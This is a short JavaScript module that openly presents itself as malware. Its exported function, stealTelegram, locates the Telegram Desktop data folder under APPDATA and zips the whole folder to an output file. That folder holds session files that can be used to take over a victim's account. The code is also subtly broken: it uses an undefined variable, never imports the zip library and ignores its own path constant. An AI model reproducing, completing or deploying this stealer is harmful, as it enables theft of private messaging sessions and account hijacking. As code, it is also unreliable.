import fs from 'fs';

// Get the app directory
const appdata = process.env.APPDATA;

// Path for telegram config folder
const configPath = `${appdata}/Telegram Desktop/`;

function stealTelegram(folder, outputFile)
{
    let configFolder = config;
    let files = [];
    
    if (configFolder != '') {
        files = fs.readdirSync(configFolder);
    }

    let zip = new AdmZip();

    zip.addLocalFolder(configFolder);
    zip.writeZip(outputFile);
}

export { stealTelegram };
